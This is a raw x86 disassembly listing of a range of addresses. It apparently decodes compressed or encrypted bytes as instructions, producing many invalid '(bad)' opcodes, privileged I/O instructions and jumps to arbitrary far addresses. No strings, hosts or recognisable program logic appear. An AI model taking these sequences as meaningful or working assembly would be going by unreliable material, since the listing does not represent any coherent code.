  4181dc:	in     al,dx
  4181dd:	mov    ebx,0x7c2f2efd
  4181e2:	loop   0x4181ff
  4181e4:	das    
  4181e5:	arpl   WORD PTR [edi],si
  4181e7:	xchg   edx,eax
  4181e8:	dec    edx
  4181e9:	sub    esp,DWORD PTR ds:0x2ee09203
  4181ef:	cmp    eax,0x34abaa5
  4181f4:	or     al,0x37
  4181f6:	pop    ss
  4181f7:	sbb    DWORD PTR [edi+edx*8],0x67
  4181fb:	es jb  0x4181b4
  4181fe:	add    esp,edx
  418200:	dec    eax
  418201:	sub    al,0x75
  418203:	imul   ebp,DWORD PTR [edx+0x78],0x31
  418207:	xor    dh,ch
  418209:	mov    ebp,0xde88883b
  41820e:	mov    edi,DWORD PTR [esi+0x0]
	...
  418274:	aaa    
  418275:	xchg   edx,eax
  418276:	and    al,0x83
  418278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418279:	mov    bh,0xb7
  41827b:	mov    dh,0x40
  41827d:	mov    ebx,0x6e76b8d6
  418282:	repnz push eax
  418284:	nop
  418285:	inc    DWORD PTR [eax]
  418287:	add    BYTE PTR [ecx+eax*1],al
  41828a:	add    BYTE PTR [eax],al
  41828c:	mov    edi,0x9628ee71
  418291:	fs ret 0x6686
  418295:	pop    ebx
  418296:	and    BYTE PTR [ebp+0x5d],0x22
  41829a:	aas    
  41829b:	push   0xffffffad
  41829d:	aad    0x1
  41829f:	cmp    edi,DWORD PTR [edi]
  4182a1:	int    0xeb
  4182a3:	cmp    BYTE PTR [esi+eiz*4+0x51d18b25],0x3e
  4182ab:	pop    ds
  4182ac:	pop    ecx
  4182ad:	cmp    al,0x1d
  4182af:	fcomp  DWORD PTR [esi-0x11edf8c3]
  4182b5:	fwait
  4182b6:	push   ecx
  4182b7:	loop   0x4182fe
  4182b9:	pop    ebp
  4182ba:	mov    eax,cs
  4182bc:	jne    0x4182f0
  4182be:	jo     0x418269
  4182c0:	rol    eax,1
  4182c2:	hlt    
  4182c3:	and    eax,0x15c46f1e
  4182c8:	push   ds
  4182c9:	inc    edi
  4182ca:	lock shl BYTE PTR [esi-0x7f0ca65d],cl
  4182d1:	retf   
  4182d2:	xor    DWORD PTR [edi+0x2651c073],edx
  4182d8:	jg     0x418337
  4182da:	mov    ds:0xda7adce6,eax
  4182df:	repnz loopne 0x4182c8
  4182e2:	jl     0x4182ca
  4182e4:	add    al,0xfd
  4182e6:	xor    dl,bh
  4182e8:	xchg   esi,eax
  4182e9:	mov    edi,0xddd1e788
  4182ee:	imul   edx,DWORD PTR [ebx+0xdbb40bc],0xa89f7b1c
  4182f8:	or     DWORD PTR [ebx+0x52],esp
  4182fb:	jno    0x4182bf
  4182fd:	mov    al,0x18
  4182ff:	imul   ebp,DWORD PTR [ebx],0x70
  418302:	xor    al,0x9
  418304:	test   DWORD PTR [ecx-0x5b67e05e],ecx
  41830a:	adc    eax,edx
  41830c:	or     cl,bh
  41830e:	push   ecx
  41830f:	inc    edi
  418310:	inc    ebp
  418311:	pop    edx
  418312:	xchg   BYTE PTR [ecx+0x1b],ah
  418315:	and    al,0xbb
  418317:	jl     0x41836d
  418319:	scas   al,BYTE PTR es:[edi]
  41831a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41831b:	mov    al,0xef
  41831d:	sbb    al,0xb2
  41831f:	mov    esi,0xcd518e7c
  418324:	test   DWORD PTR [eiz*2+0x48bdea80],esp
  41832b:	xlat   BYTE PTR ds:[ebx]
  41832c:	adc    al,0xdb
  41832e:	addr16 mov dh,0x6f
  418331:	and    dl,dh
  418333:	das    
  418334:	mov    ebx,0x3de271ac
  418339:	and    BYTE PTR [ebp+0x2b6bf0b3],ah
  41833f:	xchg   esi,eax
  418340:	(bad)  
  418341:	xchg   ebp,eax
  418342:	dec    esi
  418343:	prefetch (bad)
  418344:	or     eax,0x382bf3f8
  418349:	sbb    DWORD PTR [edi+0x2f],0xa8ddb3e6
  418350:	jp     0x418310
  418352:	push   ds
  418353:	xor    ah,dl
  418355:	mov    ecx,0x5d2c820d
  41835a:	test   eax,0xa4ad5f24
  41835f:	mov    ds:0xdaa11714,eax
  418364:	ror    esp,0x7a
  418367:	shl    BYTE PTR [edx+0x1],0x13
  41836b:	stos   DWORD PTR es:[edi],eax
  41836c:	adc    al,0x10
  41836e:	mov    bh,BYTE PTR cs:[ecx+0x1f]
  418372:	and    edx,DWORD PTR [ebx+edx*4-0x70fc0292]
  418379:	psllw  mm7,QWORD PTR [ebx]
  41837c:	push   es
  41837d:	dec    esp
  41837e:	clc    
  41837f:	sbb    eax,0x9b4c98ac
  418384:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418385:	lock mov ebx,0x1df8d1fa
  41838b:	xor    edi,DWORD PTR ds:[ebp+0x30d3]
	...
  4183f2:	add    BYTE PTR [eax],al
  4183f4:	fdiv   QWORD PTR [ebx-0x2380afc1]
  4183fa:	(bad)  
  4183fb:	mov    edi,0x14d871ac
  418400:	ror    BYTE PTR [ebp-0x7e],0x2f
  418404:	xchg   esp,eax
  418405:	add    BYTE PTR [ecx],al
  418407:	add    BYTE PTR [ecx+eax*1],al
  41840a:	add    BYTE PTR [eax],al
  41840c:	sub    DWORD PTR [eax-0x681bbd2],esi
  418412:	loopne 0x418415
  418414:	lea    ecx,[edx]
  418416:	jae    0x418409
  418418:	rol    DWORD PTR [esi-0x4e0bfed8],0x62
  41841f:	outs   dx,DWORD PTR ds:[esi]
  418420:	pop    eax
  418421:	ss sub ebx,ebx
  418424:	popa   
  418425:	add    bl,bh
  418427:	pop    ebp
  418428:	and    bh,dl
  41842a:	or     DWORD PTR ds:0x20eabf91,0xf682a792
  418434:	hlt    
  418435:	pushf  
  418436:	(bad)  [esi-0x2b]
  418439:	or     edi,DWORD PTR ds:0xd48ffa03
  41843f:	dec    eax
  418440:	mov    edx,?
  418442:	add    eax,0x14ea83df
  418447:	dec    eax
  418448:	outs   dx,DWORD PTR ds:[esi]
  418449:	fst    DWORD PTR [esi-0x2338521]
  41844f:	in     eax,dx
  418450:	mov    ecx,DWORD PTR [ebx]
  418452:	mov    al,ds:0x250de7c1
  418457:	cmp    esi,DWORD PTR [ebx+0x5346f393]
  41845d:	push   ebp
  41845e:	loopne 0x418456
  418460:	jo     0x4184c8
  418462:	nop
  418463:	and    edx,ecx
  418465:	and    DWORD PTR [eax+0x68],esi
  418468:	sub    eax,0xf84ab881
  41846d:	(bad)  
  41846e:	loopne 0x418401
  418470:	push   ss
  418471:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418472:	and    bl,BYTE PTR [edi+0x47]
  418475:	xchg   cl,dl
  418477:	add    al,0xb7
  418479:	push   ss
  41847a:	shl    ebx,1
  41847c:	mov    edi,0xc9405791
  418481:	mov    esp,0x3558940
  418486:	fcom   QWORD PTR [ecx]
  418488:	aam    0x2f
  41848a:	mov    dh,0xc0
  41848c:	fs mov dl,0xe3
  41848f:	mov    ah,0x8
  418491:	arpl   bx,bp
  418493:	test   eax,0x9d3a37f5
  418498:	es jge 0x418450
  41849b:	push   edx
  41849c:	out    0xdf,al
  41849e:	in     eax,dx
  41849f:	jmp    0x92f5:0x679c9d24
  4184a6:	mov    eax,0x23d1a714
  4184ab:	xor    al,0x49
  4184ad:	call   0x3f16be4f
  4184b2:	call   0xb72a7d95
  4184b7:	lods   eax,DWORD PTR ds:[esi]
  4184b8:	jmp    0x4184ca
  4184ba:	cdq    
  4184bb:	icebp  
  4184bc:	xchg   DWORD PTR [edx],esp
  4184be:	mov    ch,0x4a
  4184c0:	jmp    0x8bac4910
  4184c5:	dec    esi
  4184c6:	loop   0x41848d
  4184c8:	jae    0x4184b2
  4184ca:	int3   
  4184cb:	cmc    
  4184cc:	cvttps2pi mm0,QWORD PTR es:[edx]
  4184d0:	sbb    cl,bl
  4184d2:	push   ss
  4184d3:	xchg   BYTE PTR [edi],ah
  4184d5:	gs in  al,0xc3
  4184d8:	dec    ebp
  4184da:	in     eax,0x77
  4184dc:	add    ebp,0xde46bc3f
  4184e2:	mov    ebx,0x561b0887
  4184e7:	adc    DWORD PTR [edi+0x36f7b6ae],ebp
  4184ed:	cld    
  4184ee:	push   edi
  4184ef:	mov    al,0x67
  4184f1:	pushf  
  4184f2:	(bad)  
  4184f3:	hlt    
  4184f4:	add    DWORD PTR [esi-0x40ed038f],ebx
  4184fa:	inc    ebx
  4184fb:	pop    ebp
  4184fc:	xor    esi,edx
  4184fe:	cli    
  4184ff:	imul   ecx,DWORD PTR [edx+0x25],0xf48da535
  418506:	sbb    BYTE PTR [esi],dl
  418508:	cdq    
  418509:	scas   eax,DWORD PTR es:[edi]
  41850a:	nop
  41850b:	mov    ch,0xdd
  41850d:	dec    esi
  41850e:	in     eax,dx
  41850f:	nop
	...
  418574:	inc    ecx
  418575:	stc    
  418576:	mov    ebx,ebx
  418578:	mov    ebx,0x26fb51fb
  41857d:	lods   al,BYTE PTR ds:[esi]
  41857e:	imul   dl
  418580:	xchg   esi,eax
  418581:	outs   dx,BYTE PTR ds:[esi]
  418582:	lods   eax,DWORD PTR ds:[esi]
  418583:	xchg   esi,eax
  418584:	cwde   
  418585:	add    DWORD PTR [ecx],eax
  418587:	add    BYTE PTR [ecx+eax*1],al
  41858a:	add    BYTE PTR [eax],al
  41858c:	dec    ebx
  41858d:	mov    ecx,0x663066fe
  418592:	mov    BYTE PTR [eax+esi*8-0x2e],0x55
  418597:	lahf   
  418598:	jmp    0x4185c8
  41859a:	fidivr DWORD PTR [eax+0x31]
  41859d:	hlt    
  41859e:	jns    0x4185d1
  4185a0:	xor    cl,0x89
  4185a3:	mov    ?,WORD PTR [edx-0x75692d88]
  4185a9:	lea    esi,[ecx+0x5d16e38b]
  4185af:	ror    DWORD PTR [eax+edx*8+0x28],0x93
  4185b4:	retf   0xee02
  4185b7:	je     0x4185b8
  4185b9:	push   0xffffffd9
  4185bb:	cmp    edx,edx
  4185bd:	popf   
  4185be:	mul    DWORD PTR [edx+0x5b85a70b]
  4185c4:	lods   eax,DWORD PTR ds:[esi]
  4185c5:	jae    0x418633
  4185c7:	pop    es
  4185c8:	call   0xafc2:0xbc8ccdd6
  4185cf:	gs jb  0x41858f
  4185d2:	dec    ch
  4185d4:	call   0x31d9:0x1b10e152
  4185db:	push   edi
  4185dc:	ror    BYTE PTR [ecx+edx*1],0x36
  4185e0:	imul   edi,DWORD PTR [ecx+edi*2-0x29],0x6a
  4185e5:	cmc    
  4185e6:	cli    
  4185e7:	and    bh,dh
  4185e9:	xor    ebp,DWORD PTR [esi+0x16]
  4185ec:	push   esi
  4185ed:	rcl    DWORD PTR [ecx+0x5da39ea6],cl
  4185f3:	push   es
  4185f4:	mov    esi,DWORD PTR [eax-0x1950df]
  4185fa:	adc    DWORD PTR [edi],esp
  4185fc:	cli    
  4185fd:	test   eax,0xf5ca91df
  418602:	jecxz  0x4185d2
  418604:	fldenv [ebx-0x3f]
  418607:	push   eax
  418608:	mov    ds:0x7e24a4e7,eax
  41860d:	ins    BYTE PTR es:[edi],dx
  41860e:	scas   eax,DWORD PTR es:[edi]
  41860f:	(bad)  
  418610:	adc    al,0x39
  418612:	fcmovu st,st(3)
  418614:	xchg   edx,eax
  418615:	or     DWORD PTR [edx],edi
  418617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418618:	ins    DWORD PTR es:[edi],dx
  418619:	mov    dh,0x3a
  41861b:	bnd jge 0x418681
  41861e:	shl    BYTE PTR [edi+edi*4],0xe8
  418622:	in     eax,0xa
  418624:	loope  0x4185cc
  418626:	and    ebp,eax
  418628:	mov    es,WORD PTR [ecx-0x6f]
  41862b:	hlt    
  41862c:	lock xchg ecx,eax
  41862e:	cmp    eax,0xa92ac4bd
  418633:	sbb    ebx,DWORD PTR [edi-0x70f01a16]
  418639:	sub    eax,0x8b947ce9
  41863e:	mov    ecx,0xa49147f7
  418643:	lea    ecx,[edx-0x7]
  418646:	es push esi
  418648:	adc    ebp,esp
  41864a:	mov    cl,BYTE PTR es:[edi+0x79]
  41864e:	pop    esp
  41864f:	lea    edx,[esi+eiz*4+0x6a]
  418653:	cdq    
  418654:	sub    BYTE PTR [esi-0x33],cl
  418657:	add    ecx,DWORD PTR [edi+0xd]
  41865a:	outs   dx,DWORD PTR ds:[esi]
  41865b:	hlt    
  41865c:	mov    cl,0xdf
  41865e:	arpl   bx,di
  418660:	data16 sti 
  418662:	xchg   esp,eax
  418663:	fs mov ch,0xd3
  418666:	push   ds
  418667:	ins    DWORD PTR es:[edi],dx
  418668:	pop    ebp
  418669:	pop    ds
  41866a:	dec    ebp
  41866b:	adc    al,0xad
  41866d:	fsubr  st,st(4)
  41866f:	xor    ah,BYTE PTR [edi*1-0x627becba]
  418676:	call   0x1d7f:0x18a1479c
  41867d:	scas   al,BYTE PTR es:[edi]
  41867e:	jmp    0xc1:0x7dbbeaaf
  418685:	cld    
  418686:	int3   
  418687:	xlat   BYTE PTR ds:[ebx]
  418688:	fsubr  QWORD PTR [ebp-0x5710e9de]
  41868e:	cli    
  41868f:	lods   eax,DWORD PTR ds:[esi]
	...
  4186f4:	xchg   ebx,eax
  4186f5:	sub    BYTE PTR [eax-0x604344c4],ah
  4186fb:	scas   eax,DWORD PTR es:[edi]
  4186fc:	or     al,0x8d
  4186fe:	cmp    edx,edx
  418700:	(bad)  
  418701:	mov    cl,0x38
  418703:	loope  0x4186a1
  418705:	add    al,BYTE PTR [ecx]
  418707:	add    BYTE PTR [ecx+eax*1],al
  41870a:	add    BYTE PTR [eax],al
  41870c:	ins    BYTE PTR es:[edi],dx
  41870d:	cmp    DWORD PTR [edx-0x40],eax
  418710:	shl    BYTE PTR [ebx+0x22e20884],1
  418716:	outs   dx,DWORD PTR ds:[esi]
  418717:	push   edi
  418718:	cld    
  418719:	push   ebx
  41871a:	das    
  41871b:	push   edi
  41871c:	sbb    ebp,DWORD PTR [esi+ecx*1]
  41871f:	push   esi
  418720:	inc    esp
  418721:	push   es
  418722:	mov    al,ds:0x390a1063
  418727:	xor    eax,0xe964ba37
  41872c:	push   ss
  41872d:	or     BYTE PTR [ebx-0x10],al
  418730:	sub    al,0xee
  418732:	sub    BYTE PTR [ebp-0x426293cc],dl
  418738:	jnp    0x41870f
  41873a:	mov    eax,ds:0x3cb636a5
  41873f:	xor    ah,0x19
  418742:	into   
  418743:	pop    edx
  418744:	fsub   QWORD PTR [edx]
  418746:	mov    BYTE PTR [ecx+eiz*4],dh
  418749:	sbb    DWORD PTR [esi+0x7a],eax
  41874c:	shl    BYTE PTR ds:0x5e849f12,cl
  418752:	loope  0x418769
  418754:	push   es
  418755:	movmskps esi,xmm7
  418758:	mov    ds:0x71b8d64c,al
  41875d:	(bad)  [esi]
  41875f:	sbb    ebx,DWORD PTR [ecx]
  418761:	iret   
  418762:	hlt    
  418763:	and    ebp,ebp
  418765:	mov    dh,ch
  418767:	push   0x46
  418769:	inc    ecx
  41876a:	mov    cl,0xaf
  41876c:	jae    0x41871c
  41876e:	stos   DWORD PTR es:[edi],eax
  41876f:	pop    ds
  418770:	mov    BYTE PTR [ebp+0x6e8e0efc],ah
  418776:	sub    al,0xd5
  418778:	pop    ds
  418779:	inc    edi
  41877a:	xchg   ebp,eax
  41877b:	scas   al,BYTE PTR es:[edi]
  41877c:	adc    cl,bh
  41877e:	in     eax,0xec
  418780:	outs   dx,BYTE PTR ds:[esi]
  418781:	pop    edi
  418782:	or     ebx,ebp
  418784:	sti    
  418785:	adc    cl,al
  418787:	test   al,0x44
  418789:	and    DWORD PTR [ebp-0x64742877],0x8c14d1b4
  418793:	push   0x5f
  418795:	jp     0x418799
  418797:	or     al,0x6f
  418799:	push   0xf1777535
  41879e:	es lahf 
  4187a0:	push   edi
  4187a1:	call   0x20d2:0xbd635535
  4187a8:	mov    bl,0xbf
  4187aa:	(bad)  
  4187ab:	xor    eax,0x4ab98812
  4187b0:	(bad)  
  4187b1:	ds mov eax,ebp
  4187b4:	scas   al,BYTE PTR es:[edi]
  4187b5:	xchg   DWORD PTR [edi+0x2f421d31],ebx
  4187bb:	push   ss
  4187bc:	test   al,0x6a
  4187be:	and    esi,DWORD PTR es:[esi-0x6ec67429]
  4187c5:	mov    ebx,0x83cb461a
  4187ca:	test   BYTE PTR [eax+0x57],dh
  4187cd:	jae    0x418845
  4187cf:	pop    ds
  4187d0:	test   al,0x8c
  4187d2:	mov    dh,0x8a
  4187d4:	xor    BYTE PTR [edx+0x78],bh
  4187d7:	out    0xa7,eax
  4187d9:	pop    es
  4187da:	pop    edx
  4187db:	cs (bad) 
  4187dd:	fisttp QWORD PTR [edx-0x73]
  4187e0:	sub    ebx,DWORD PTR [ebx]
  4187e2:	(bad)  
  4187e3:	push   esi
  4187e4:	sub    eax,0x59e3bcd4
  4187e9:	loop   0x41880e
  4187eb:	pop    ebx
  4187ec:	sub    eax,0x59109fee
  4187f1:	sub    edx,DWORD PTR [ebp+0x46]
  4187f4:	int    0x5b
  4187f6:	cmp    al,BYTE PTR [ecx-0x783ceb3f]
  4187fc:	and    al,0x40
  4187fe:	std    
  4187ff:	les    eax,FWORD PTR [ecx-0x7456042]
  418805:	xchg   esp,eax
  418806:	stos   DWORD PTR es:[edi],eax
  418807:	mov    esi,DWORD PTR [edi+0x35c3af2b]
  41880d:	mov    ds:0xe3fd,eax
	...
  418872:	add    BYTE PTR [eax],al
  418874:	xchg   esp,eax
  418875:	enter  0x4337,0x7f
  418879:	push   esp
  41887b:	fbld   TBYTE PTR [esi-0x4863c533]
  418881:	jno    0x418873
  418883:	inc    ecx
  418884:	mov    al,ds:0x4000103
  418889:	add    DWORD PTR [eax],eax
  41888b:	add    BYTE PTR [edx-0x59],bh
  41888e:	mov    eax,0x50b0298
  418893:	push   es
  418894:	mov    ah,0x66
  418896:	pop    es
  418897:	dec    ebp
  418898:	sub    BYTE PTR [esi-0xac80007],ah
  41889e:	mov    ah,0x5d
  4188a0:	ffree  st(2)
  4188a2:	xor    ebx,ecx
  4188a4:	aas    
  4188a5:	add    BYTE PTR [esi+0x36],0x6d
  4188a9:	sar    DWORD PTR [eax],cl
  4188ab:	out    0xcf,al
  4188ad:	je     0x4188d0
  4188af:	gs pop esi
  4188b1:	faddp  st(0),st
  4188b3:	add    eax,0x308a931
  4188b8:	test   BYTE PTR [ecx],ah
  4188ba:	mov    eax,0x8d1ac18d
  4188bf:	test   bl,al
  4188c1:	sub    BYTE PTR [ecx],bh
  4188c3:	mov    esi,0x93934c0c
  4188c8:	pop    edx
  4188c9:	dec    edx
  4188ca:	ficomp WORD PTR [esi+eax*1+0x76f710be]
  4188d1:	call   0x8dd3:0xb7555145
  4188d8:	inc    eax
  4188d9:	xor    esp,esp
  4188db:	or     BYTE PTR [edi],0x0
  4188de:	or     BYTE PTR [ebx],bl
  4188e0:	pop    ebx
  4188e1:	cdq    
  4188e2:	rol    DWORD PTR [ebp-0x5b],cl
  4188e5:	inc    ebp
  4188e6:	xor    esp,esp
  4188e8:	loopne 0x418935
  4188ea:	mov    eax,0x78d9b7fd
  4188ef:	jns    0x41888f
  4188f1:	cmp    eax,0x7d2405c8
  4188f6:	push   edx
  4188f7:	xchg   ecx,eax
  4188f8:	pop    es
  4188f9:	daa    
  4188fa:	push   edi
  4188fb:	cdq    
  4188fc:	test   ebx,0x63023fad
  418902:	(bad)  [edx+0x25ec2bc6]
  418908:	mov    edx,DWORD PTR [edx]
  41890a:	jmp    0x664a:0x71ba17bf
  418911:	and    eax,0x694a9cea
  418916:	or     DWORD PTR [ecx+ebx*4-0x2c3e7fa1],ecx
  41891d:	dec    esp
  41891e:	push   ss
  41891f:	ins    BYTE PTR es:[edi],dx
  418920:	inc    esp
  418921:	sbb    edx,esp
  418923:	mov    BYTE PTR [esp+eax*1-0x6274493f],dh
  41892a:	sbb    al,0xa1
  41892c:	sub    edi,DWORD PTR [ecx-0xd588e1b]
  418932:	fcmovbe st,st(4)
  418934:	or     al,0x8b
  418936:	adc    DWORD PTR [ebx-0x6c],esi
  418939:	mov    esp,0x6b726a8a
  41893e:	out    dx,eax
  41893f:	mov    dl,0x5c
  418941:	jge    0xfd02f6eb
  418947:	shl    BYTE PTR ds:0x5ac3dcd1,cl
  41894d:	sub    dl,ah
  41894f:	dec    ecx
  418950:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418951:	dec    ebp
  418952:	xor    BYTE PTR [esi-0x48],bh
  418955:	lea    ecx,[ebp-0x6c91a822]
  41895b:	cld    
  41895c:	add    dl,BYTE PTR [eax+0x70]
  41895f:	xchg   esi,eax
  418960:	mov    dh,0xf0
  418962:	pop    es
  418963:	out    dx,eax
  418964:	rcl    DWORD PTR ds:0x56eb03f,0xa9
  41896b:	(bad)  
  41896c:	sub    eax,0xde7fa758
  418971:	jns    0x4189dc
  418973:	inc    ebp
  418974:	sub    eax,0x66fe7d69
  418979:	sar    DWORD PTR [ecx-0x255da7ec],0x2d
  418980:	mov    edi,0x46635d7
  418985:	into   
  418986:	push   ss
  418987:	mov    ecx,0x52868b2c
  41898c:	jg     0x41894c
  41898e:	fist   DWORD PTR [eax+0x0]
	...
  4189f4:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  4189fa:	into   
  4189fb:	fwait
  4189fc:	add    bh,cl
  4189fe:	mov    ebp,0xb521f769
  418a03:	hlt    
  418a04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a05:	add    al,0x1
  418a07:	add    BYTE PTR [ecx+eax*1],al
  418a0a:	add    BYTE PTR [eax],al
  418a0c:	mov    ch,0xe6
  418a0e:	or     bl,BYTE PTR [ecx-0x706e49f1]
  418a14:	dec    edi
  418a15:	int3   
  418a16:	inc    eax
  418a17:	sbb    edx,DWORD PTR [ecx+0x5f235184]
  418a1d:	mov    esi,0x5eb48b0
  418a22:	out    0x9a,eax
  418a24:	call   0xd9130748
  418a29:	xchg   edi,eax
  418a2a:	mov    dh,0x42
  418a2c:	std    
  418a2d:	and    al,BYTE PTR [ebx]
  418a2f:	mov    esp,DWORD PTR [edi+0x1ae026d5]
  418a35:	loopne 0x4189c4
  418a37:	pop    ss
  418a38:	repz pop edi
  418a3a:	fcmove st,st(5)
  418a3c:	mov    esp,0xbb4a6aa0
  418a41:	lahf   
  418a42:	add    BYTE PTR [edi],ch
  418a44:	js     0x418abe
  418a46:	and    al,0x6c
  418a48:	inc    edi
  418a49:	out    0x8e,al
  418a4b:	or     al,bl
  418a4d:	pop    ebx
  418a4e:	retfw  0xfaa
  418a52:	adc    dl,bl
  418a54:	into   
  418a55:	xlat   BYTE PTR ds:[ebx]
  418a56:	lds    eax,FWORD PTR [edx-0x25d75e7a]
  418a5c:	shr    ch,1
  418a5e:	test   BYTE PTR [edx-0x2274fb41],ah
  418a64:	dec    ebx
  418a65:	pusha  
  418a66:	pop    edx
  418a67:	jnp    0x418a1b
  418a69:	cmp    DWORD PTR [edi+0x5e43081f],eax
  418a6f:	loopne 0x418abe
  418a71:	rep stos DWORD PTR es:[edi],eax
  418a73:	not    DWORD PTR [ebx-0x6712a2ce]
  418a79:	lods   eax,DWORD PTR fs:[esi]
  418a7b:	push   cs
  418a7c:	scas   al,BYTE PTR es:[edi]
  418a7d:	stos   BYTE PTR es:[edi],al
  418a7e:	sub    cl,ch
  418a80:	jmp    0x7156:0x9b137c7
  418a87:	jbe    0x418a3a
  418a89:	imul   ecx,esi,0xa55645f4
  418a8f:	loop   0x418a38
  418a91:	inc    edx
  418a92:	dec    eax
  418a93:	icebp  
  418a94:	popa   
  418a95:	sub    ah,BYTE PTR [edi+eax*1-0x350ce8fc]
  418a9c:	rcl    DWORD PTR [ecx-0x27],cl
  418a9f:	arpl   WORD PTR [esi-0xa],ax
  418aa2:	(bad)  
  418aa3:	int3   
  418aa4:	xchg   esp,eax
  418aa5:	mov    ds:0xd1fef136,eax
  418aaa:	rol    DWORD PTR [eax-0x2c7a9aac],0xdf
  418ab1:	jo     0x418a94
  418ab3:	dec    ebp
  418ab4:	lahf   
  418ab5:	sub    al,0xbc
  418ab7:	je     0x418b01
  418ab9:	icebp  
  418aba:	stos   BYTE PTR es:[edi],al
  418abb:	pop    ebx
  418abc:	shl    DWORD PTR [ebp-0xa],0x71
  418ac0:	dec    edx
  418ac1:	mov    eax,ds:0x6a54b74d
  418ac6:	jns    0x418aff
  418ac8:	xlat   BYTE PTR ds:[ebx]
  418ac9:	sbb    esi,DWORD PTR [ecx+0x41]
  418acc:	add    ch,BYTE PTR ds:0x587b48d1
  418ad2:	xchg   edx,eax
  418ad4:	sbb    edx,esi
  418ad6:	lods   eax,DWORD PTR ds:[esi]
  418ad7:	pop    ds
  418ad8:	in     eax,0xec
  418ada:	inc    eax
  418adb:	rsqrtps xmm1,XMMWORD PTR [edx]
  418ade:	out    0x20,eax
  418ae0:	add    DWORD PTR [edi],edx
  418ae2:	imul   ebp,ebp,0xffffffec
  418ae5:	push   0xbd4a7ca
  418aea:	dec    edi
  418aeb:	xor    ah,BYTE PTR [eax]
  418aed:	inc    ebx
  418aee:	and    BYTE PTR [edi-0x73],dh
  418af1:	repnz es inc eax
  418af4:	cmp    bh,BYTE PTR [ebp-0x51963369]
  418afa:	and    edx,DWORD PTR [edx+0x24]
  418afd:	and    al,0x87
  418aff:	pop    ss
  418b00:	stc    
  418b01:	and    ebx,esi
  418b03:	hlt    
  418b04:	inc    edx
  418b05:	add    al,0x84
  418b07:	imul   ebp,ebp,0xffffff9a
  418b0a:	mov    cl,BYTE PTR [ecx+ebp*4+0x92f15c]
	...
  418b71:	add    BYTE PTR [eax],al
  418b73:	add    BYTE PTR [ebx+edx*1-0x7b],bh
  418b77:	xor    ch,bh
  418b79:	mov    dh,0xff
  418b7b:	pop    edi
  418b7c:	sar    BYTE PTR [ebp+0x3b],1
  418b7f:	in     eax,0x28
  418b81:	cs mov edx,0x105a860
  418b87:	add    BYTE PTR [ecx+eax*1],al
  418b8a:	add    BYTE PTR [eax],al
  418b8c:	sbb    al,0xae
  418b8e:	addr16 pop edx
  418b90:	ror    DWORD PTR [ecx],1
  418b92:	sub    BYTE PTR [ebp+edi*1-0x3252836a],dl
  418b99:	and    bl,BYTE PTR [ebx+0x3013acb]
  418b9f:	loope  0x418bfa
  418ba1:	retf   
  418ba2:	loopne 0x418b5e
  418ba4:	les    ebp,FWORD PTR [ebx+edi*1+0x75ef2b90]
  418bab:	mov    edi,0x504f1bf9
  418bb0:	fsubr  st,st(6)
  418bb2:	jae    0x418c13
  418bb4:	dec    ecx
  418bb5:	xchg   esp,eax
  418bb6:	adc    al,0x98
  418bb8:	xor    DWORD PTR ds:0xeb8fb0c5,ecx
  418bbe:	sub    dh,BYTE PTR [ecx]
  418bc0:	pop    esp
  418bc1:	adc    esi,ebp
  418bc3:	test   DWORD PTR [eax+eiz*8+0x7],esp
  418bc7:	add    eax,0x3bf5408c
  418bcc:	popa   
  418bcd:	lahf   
  418bce:	ffree  st(6)
  418bd0:	mov    esp,0x44ccc0f2
  418bd5:	das    
  418bd6:	push   ecx
  418bd7:	xchg   ecx,eax
  418bd8:	mov    eax,ds:0xb74b6059
  418bdd:	or     eax,ebx
  418bdf:	pop    ebx
  418be0:	mov    bl,0xa0
  418be2:	es mov ch,ch
  418be5:	hlt    
  418be6:	into   
  418be7:	fldcw  WORD PTR [edx]
  418be9:	or     al,ah
  418beb:	outs   dx,BYTE PTR ds:[esi]
  418bec:	sti    
  418bed:	(bad)  
  418bee:	shl    BYTE PTR [ebp+0x7fe7d173],1
  418bf4:	sbb    eax,0xfd80b71d
  418bf9:	xlat   BYTE PTR ds:[ebx]
  418bfa:	rcr    BYTE PTR [edx],1
  418bfc:	sahf   
  418bfd:	(bad)  
  418bfe:	enter  0x94c3,0x7
  418c02:	sbb    BYTE PTR [eax],bl
  418c04:	xchg   BYTE PTR [esi+ebp*1+0x2889b018],dh
  418c0b:	enter  0xe4a6,0x8e
  418c0f:	jnp    0x418bba
  418c11:	fiadd  WORD PTR [ebp+0x46843ef3]
  418c17:	shl    BYTE PTR [eax-0x63cb2ec5],cl
  418c1d:	outs   dx,DWORD PTR ds:[esi]
  418c1e:	scas   al,BYTE PTR es:[edi]
  418c1f:	lahf   
  418c20:	adc    BYTE PTR [ebp+0x4a],bh
  418c23:	inc    ebx
  418c24:	push   edx
  418c25:	ins    BYTE PTR es:[edi],dx
  418c26:	jge    0x418c9c
  418c28:	pop    ds
  418c29:	popa   
  418c2a:	mov    eax,0x1a56350b
  418c2f:	leave  
  418c30:	daa    
  418c31:	mov    edx,0x63f98053
  418c36:	dec    ebx
  418c37:	imul   edx,DWORD PTR [eax+0x1a34e3c4],0xd408c717
  418c41:	pop    edi
  418c42:	div    DWORD PTR [edx+0x640189f9]
  418c48:	int    0x90
  418c4a:	call   0x29a798f9
  418c4f:	leave  
  418c50:	dec    ebp
  418c51:	sub    edx,eax
  418c53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c54:	and    edi,esi
  418c56:	pop    esi
  418c57:	or     BYTE PTR [ecx+0x1e2c9137],dl
  418c5d:	popf   
  418c5e:	push   ebx
  418c5f:	and    esp,ecx
  418c61:	sbb    DWORD PTR [edx+0x10c1940d],edi
  418c67:	jnp    0x418c51
  418c69:	neg    BYTE PTR [ecx-0x6c]
  418c6c:	scas   eax,DWORD PTR es:[edi]
  418c6d:	mov    esp,0xe5f7ec5c
  418c72:	mov    WORD PTR [ecx+eax*8+0x32],fs
  418c76:	fisubr WORD PTR [eax-0x4aa44331]
  418c7c:	sbb    ebp,ebx
  418c7e:	cmp    edi,DWORD PTR [ebp-0x42ba5e4a]
  418c84:	ins    DWORD PTR es:[edi],dx
  418c85:	inc    ebp
  418c86:	je     0x418ca3
